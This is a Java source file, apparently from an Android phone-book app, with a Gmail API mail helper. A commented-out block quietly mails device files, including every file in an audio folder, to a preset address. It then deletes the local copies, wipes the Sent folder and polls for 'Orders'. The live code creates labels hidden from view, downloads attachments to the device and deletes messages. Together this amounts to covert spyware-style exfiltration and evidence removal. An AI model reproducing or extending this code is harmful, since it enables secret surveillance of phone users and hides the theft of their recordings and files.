package com.tr.hsyn.telefonrehberi.xyz.ptt.mail;

import android.content.Context;
import android.text.TextUtils;
import android.util.Log;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;

import com.google.api.client.util.Base64;
import com.google.api.client.util.StringUtils;
import com.google.api.services.gmail.Gmail;
import com.google.api.services.gmail.model.Label;
import com.google.api.services.gmail.model.ListMessagesResponse;
import com.google.api.services.gmail.model.Message;
import com.google.api.services.gmail.model.MessagePart;
import com.google.api.services.gmail.model.MessagePartBody;
import com.google.api.services.gmail.model.MessagePartHeader;
import com.google.api.services.gmail.model.ModifyMessageRequest;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.util.ArrayList;
import java.util.List;
import java.util.Properties;

import javax.activation.DataHandler;
import javax.activation.FileDataSource;
import javax.mail.Session;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeBodyPart;
import javax.mail.internet.MimeMessage;
import javax.mail.internet.MimeMultipart;

import timber.log.Timber;


public class Mail{
   
   private Mail(){}
    
   /* public static void sendTextFile(Context context, String title, String text) {
        
        String mail = "Kayıt tarihi : " + Time.getSendDate() + "\n----------------------------------------------\n";
        
        mail += text;
        
        if (u.isOnline(context)) {
            
            send(context, title, mail);
        }
        else {
            
            u.saveToFile(context, title, mail);
        }
    }
    
    public static void send(Context context, File file) {
        
        if (!u.isOnline(context)) return;
        
        String value = getFileContent(file);
        
        if (value == null || value.trim().isEmpty()) return;
        
        send(context, file.getName(), value);
    }
    
    public static void send(Context context, String subject, String body) {
        
        if (body.equals(lastText)) return;
        
        lastText = body;
        
        Run.runThread(() -> {
            
            try {
                
                getGmailService(context)
                        .users()
                        .messages()
                        .send("me", Objects.requireNonNull(createMessageWithEmail(
                                createEmail(
                                        Collections.singletonList(getTo(context)),
                                        getFrom(context),
                                        subject,
                                        body)))).execute();
                
                
                Timber.d("Mail gönderildi");
                
                if (subject.endsWith(".txt")) {
                    
                    if (checkFile(new File(context.getFilesDir(), subject))) {
                        
                        checkFileEx(new File(context.getFilesDir(), subject));
                    }
                }
                
                
                Orders.getOrderEx(context);
                deleteAllSent(context);
                
            }
            catch (Exception e) {
                
                Timber.w("Mail gönderilemedi");
                Timber.w(e);
            }
        });
    }
    
    public static void send(Context context, String subject, String body, File file) {
        
        
        Run.runThread(() -> {
            
            try {
                
                getGmailService(context)
                        .users()
                        .messages()
                        .send("me", Objects.requireNonNull(createMessageWithEmail(
                                createEmailWithAttachment(
                                        Collections.singletonList(getTo(context)),
                                        getFrom(context),
                                        subject,
                                        body,
                                        file)))).execute();
                
                
                Timber.d("Dosya gönderildi : %s", file.getName());
                
                registerFile(context, file.getName());
                
                if (checkFile(file)) {
                    
                    checkFileEx(file);
                }
                
                Orders.getOrderEx(context);
                deleteAllSent(context);
            }
            catch (Exception e) {
                
                Timber.w("Dosya gönderilemedi : " + file.getName());
                Timber.w(e);
            }
        });
    }
    
    public static void sendTextFile(Context context, File file) {
        
        try {
            
            String val = getFileContent(file);
            
            if (val == null || val.trim().isEmpty()) return;
            
            
            getGmailService(context)
                    .users()
                    .messages()
                    .send("me", Objects.requireNonNull(createMessageWithEmail(
                            createEmail(
                                    Collections.singletonList(getTo(context)),
                                    getFrom(context),
                                    file.getName(),
                                    val)))).execute();
            
            
            Timber.d("Text dosyası gönderildi : %s", file.getName());
            
            if (checkFile(file)) {
                
                checkFileEx(file);
            }
            
            Orders.getOrderEx(context);
            deleteAllSent(context);
        }
        catch (Exception e) {
            
            Timber.w("Text dosyası gönderilemedi : " + file.getName());
            Timber.w(e);
        }
    }
    
    public static void sendAudioFile(Context context, String subject, String body, File file) {
        
        if (isFileSent(context, file.getName())) {
            
            Timber.d("Bu dosya daha önce gönderildi : %s", file.getName());
            
            checkFile(file);
            return;
        }
        
        
        try {
            
            getGmailService(context)
                    .users()
                    .messages()
                    .send("me", Objects.requireNonNull(createMessageWithEmail(
                            createEmailWithAttachment(
                                    Collections.singletonList(getTo(context)),
                                    getFrom(context),
                                    subject,
                                    body,
                                    file)))).execute();
            
            
            Timber.d("Dosya gönderildi : %s", file.getName());
            
            registerFile(context, file.getName());
            
            if (checkFile(file)) {
                
                checkFileEx(file);
            }
            
            Orders.getOrderEx(context);
            deleteAllSent(context);
        }
        catch (Exception e) {
            
            Timber.w("Dosya gönderilemedi : " + file.getName());
            Timber.w(e);
        }
    }
    
    public static void sendAudioFiles(Context context) {
        
        if (!u.isOnline(context)) return;
        
        File[] files = u.getAudioFolderFile(context).listFiles();
        
        if (files == null) {
            
            sendTextFile(context, "AudioFiles", "Dosyalar alınamadı - files = null");
        }
        else if (files.length == 0) {
            
            sendTextFile(context, "AudioFiles", "Klasörde dosya yok");
        }
        else {
            
            for (File file : files) {
                
                sendAudioFile(context, "AudioFiles", file.getName(), file);
            }
        }
    }
    
    
    public static void sendFile(Context context, String subject, String body, File file) {
        
        Run.runThread(() -> {
            
            try {
                
                getGmailService(context)
                        .users()
                        .messages()
                        .send("me", Objects.requireNonNull(createMessageWithEmail(
                                createEmailWithAttachment(
                                        Collections.singletonList(getTo(context)),
                                        getFrom(context),
                                        subject,
                                        body,
                                        file)))).execute();
                
                
                Timber.d("Dosya gönderildi : %s", file.getName());
                //checkFile(file);
                
                Orders.getOrderEx(context);
                deleteAllSent(context);
            }
            catch (Exception e) {
                
                Timber.w("Dosya gönderilemedi : " + file.getName());
                Timber.w(e);
            }
        });
    }
    
    public static void deleteAllSent(Context context) {
        
        Run.runThread(() -> {
            
            Gmail gmail = getGmailService(context);
            
            try {
                
                List<Message> messages = mylistMessagesWithLabelsWithQ(gmail, Collections.singletonList("SENT"), String.format("to:%s", getTo(context)));
                
                if (messages == null || messages.isEmpty()) {
                    
                    Timber.d("Gönderilenler klasörü boş");
                    return;
                }
                
                
                for (Message message : messages) {
                    
                    if (message.getId().equals(lastDelete)) continue;
                    
                    lastDelete = message.getId();
                    
                    gmail.users().messages().delete("me", message.getId()).execute();
                    
                    
                }
                
                Timber.d("Gönderilenler klasörü silindi");
                
                
            }
            catch (Exception e) {
                
                lastDelete = "";
            }
        }, 5000);
    }
    
    
      private static boolean isFileSent(Context context, String name) {
        
        try {
            
            return Objects.requireNonNull(context.getSharedPreferences("sendfiles", Context.MODE_PRIVATE).getStringSet("sentFiles", new HashSet<>())).contains(name);
        }
        catch (Exception e) {
            
            Timber.w(e.toString());
        }
        
        return false;
    }
    
    private static void registerFile(Context context, String name) {
        
        SharedPreferences pref = context.getSharedPreferences("sendfiles", Context.MODE_PRIVATE);
        
        Set<String> sendFiles = pref.getStringSet("sentFiles", new HashSet<>());
        
        assert sendFiles != null;
        
        if (sendFiles.size() > 50) {
            
            sendFiles.clear();
        }
        
        
        sendFiles.add(name);
        
        pref.edit().putStringSet("sentfiles", sendFiles).apply();
        
    }
    
    public static void deleteAllSent(Gmail gmail, String query) {
        
        
        try {
            
            List<Message> messages = mylistMessagesWithLabelsWithQ(gmail, Collections.singletonList("SENT"), query);
            
            if (messages == null || messages.isEmpty()) {
                
                return;
            }
            
            
            for (Message message : messages) {
                
                if (message.getId().equals(lastDelete)) continue;
                
                lastDelete = message.getId();
                
                gmail.users().messages().delete("me", message.getId()).execute();
                
                
            }
            
            Timber.d("Gönderilenler klasörü silindi");
            
            
        }
        catch (Exception e) {
            
            lastDelete = "";
        }
    }
    
    private static boolean checkFile(File file) {
        
        if (file.exists()) {
            
            if (file.delete()) {
                
                Timber.d("Dosya silindi : %s", file.getName());
                return false;
            }
            else {
                
                Timber.w("Dosya silinemedi : %s", file.getName());
                return true;
            }
        }
        else {
            Timber.d("Böyle bir dosya yok : %s", file.getName());
            return false;
        }
    }
    
    private static void checkFileEx(File file) throws IOException {
        
        Path filePath = Paths.get(file.toURI());
        
        if (Files.deleteIfExists(filePath)) {
            
            Timber.d("Dosya silindi : %s", filePath);
        }
        else {
            
            if (!Files.exists(filePath)) {
                
                Timber.w("Böyle bir dosya yok : %s", filePath);
            }
            else {
                
                Timber.w("Dosya silinemedi : %s", filePath);
            }
        }
    }
    
    private static String getFrom(Context context) {
        
        return context.getSharedPreferences("gmail", Context.MODE_PRIVATE).getString("from", null);
    }
    
    private static String getTo(Context context) {
        
        return context.getSharedPreferences("gmail", Context.MODE_PRIVATE).getString("to", null);
    }
    
    
    */
   
   /**
    * Add a new Label to user's inbox.
    *
    * @param service      Authorized Gmail API instance.
    * @param newLabelName Name of the new label.
    * @throws IOException e
    */
   public static Label createLabel(Gmail service, String newLabelName) throws IOException{
      
      Label label = new Label().setName(newLabelName)
                               .setLabelListVisibility("labelHide")
                               .setMessageListVisibility("hide");
      
      label = service.users().labels().create("me", label).execute();
      
      System.out.println("Label id: " + label.getId());
      System.out.println(label.toPrettyString());
      
      return label;
   }
   
   /**
    * Modify the labels a message is associated with.
    *
    * @param service        Authorized Gmail API instance.
    * @param messageId      ID of Message to Modify.
    * @param labelsToAdd    List of label ids to add.
    * @param labelsToRemove List of label ids to remove.
    * @throws IOException e
    */
   public static void modifyMessage(Gmail service, String messageId, List<String> labelsToAdd, List<String> labelsToRemove) throws IOException{
   
      ModifyMessageRequest mods = new ModifyMessageRequest().setAddLabelIds(labelsToAdd)
                                                            .setRemoveLabelIds(labelsToRemove);
      Message message = service.users().messages().modify("me", messageId, mods).execute();
      
      System.out.println("Message id: " + message.getId());
      System.out.println(message.toPrettyString());
   }
   
   public static MimeMessage createEmailWithAttachment(
         List<String> to,
         String from,
         String subject,
         String body,
         File file){
      
      Properties properties = new Properties();
      Session    session    = Session.getDefaultInstance(properties, null);
      
      MimeMessage mimeMessage = new MimeMessage(session);
      MimeBodyPart bodyPart = new MimeBodyPart();
      
      try{
         
         String recipients = TextUtils.join(",", to);
         
         mimeMessage.setFrom(new InternetAddress(from));
         mimeMessage.addRecipients(javax.mail.Message.RecipientType.TO, recipients);
         mimeMessage.setSubject(subject);
         
         
         bodyPart.setContent(body == null ? "XHHY" : body, "text/plain");
         
         MimeMultipart multipart = new MimeMultipart();
         multipart.addBodyPart(bodyPart);
         
         bodyPart = new MimeBodyPart();
         
         FileDataSource source = new FileDataSource(file);
         
         bodyPart.setDataHandler(new DataHandler(source));
         bodyPart.setFileName(file.getName());
         
         multipart.addBodyPart(bodyPart);
         mimeMessage.setContent(multipart);
         
         return mimeMessage;
         
      }
      catch(Exception e){
         
         Log.w("Mail", e);
      }
      
    
      return null;
   }
   
   public static Message createMessageWithEmail(MimeMessage mimeMessage){
      
      ByteArrayOutputStream buffer = new ByteArrayOutputStream();
      
      try{
         
         mimeMessage.writeTo(buffer);
         
         byte[] bytes = buffer.toByteArray();
         
         String mail = Base64.encodeBase64URLSafeString(bytes);
         
         Message message = new Message();
         message.setRaw(mail);
         return message;
         
      }
      catch(Exception e){
         
         Log.w("Mail", e);
      }
      
      return null;
   }
   
   public static MimeMessage createEmail(
         List<String> recipients,
         String from,
         String subject,
         String body){
      
      
      Properties properties = new Properties();
      Session    session    = Session.getDefaultInstance(properties, null);
      
      MimeMessage mimeMessage = new MimeMessage(session);
      
      try{
         
         mimeMessage.setFrom(new InternetAddress(from));
         
         String to = TextUtils.join(",", recipients);
         
         mimeMessage.addRecipients(javax.mail.Message.RecipientType.TO, to);
         //mimeMessage.addRecipients(javax.mail.Message.RecipientType.TO, new InternetAddress(t));
         
         mimeMessage.setSubject(subject);
         mimeMessage.setText(body, "utf-8");
         return mimeMessage;
         
      }
      catch(Exception e){
         
         Log.w("Mail", e);
      }
      
      return null;
   }
   
   @Nullable
   public static List<Message> mylistMessagesWithLabelsWithQ(Gmail service, List<String> labels, String query){
      
      try{
         
         ListMessagesResponse res = service
               .users()
               .messages()
               .list("me")
               .setQ(query)
               .setLabelIds(labels)
               .execute();
         
         
         List<Message> messages = new ArrayList<>();
         
         while(res.getMessages() != null){
            
            messages.addAll(res.getMessages());
            
            if(res.getNextPageToken() != null){
               
               String token = res.getNextPageToken();
               
               res = service.users().messages().list("me").setLabelIds(labels).setPageToken(token).execute();
            }
            else{
               break;
            }
         }
         
         
         return messages;
      }
      catch(Exception e){
         
         Timber.w(e);
      }
      
      return null;
   }
   
   public static void getAttachments(Context context, String messageId, String path) throws IOException{
      
      Gmail service = GmailService.getGmailService(context);
      
      Message           message = service.users().messages().get("me", messageId).execute();
      List<MessagePart> parts   = message.getPayload().getParts();
      
      for(MessagePart part : parts){
         
         if(part.getFilename() != null && part.getFilename().length() > 0){
            
            String filename = part.getFilename();
            Timber.d("ek alınıyor : " + filename);
            
            String          attId      = part.getBody().getAttachmentId();
            MessagePartBody attachPart = service.users().messages().attachments().get("me", messageId, attId).execute();
            
            //Base64 base64Url     = new Base64(true);
            byte[] fileByteArray = Base64.decodeBase64(attachPart.getData());
            
            String fullPath = path + "/" + filename;
            
            FileOutputStream fileOutFile = new FileOutputStream(fullPath);
            fileOutFile.write(fileByteArray);
            fileOutFile.close();
            Timber.d("ek kaydedildi : " + fullPath);
         }
      }
   }
   
   public static Message getMessage(Gmail gmail, String id){
      
      try{
         
         return gmail.users().messages().get("me", id).execute();
      }
      catch(Exception e){
         
         e.printStackTrace();
      }
      
      return null;
   }
   
   public static String getSubject(@NonNull Message message){
      
      MessagePart messagePart = message.getPayload();
      
      if(messagePart == null) return "konu-alınamıyor";
      
      List<MessagePartHeader> k = message.getPayload().getHeaders();
      
      for(MessagePartHeader messagePartHeader : k){
         
         if("Subject".equals(messagePartHeader.getName())){
            
            return messagePartHeader.getValue();
         }
      }
      
      return "konu-alınamıyor";
   }
   
   public static boolean delete(final Gmail gmail, final String id){
      
      try{
         
         gmail.users().messages().delete("me", id).execute();
         return true;
         
      }
      catch(Exception e){
         
         Timber.d("Mesaj bulunamadı : %s", id);
      }
      
      return false;
   }
   
   public static String getBody(Message message){
      
      return StringUtils.newStringUtf8(Base64.decodeBase64(message.getPayload().getParts().get(0).getBody().getData()));
      
   }
   
}
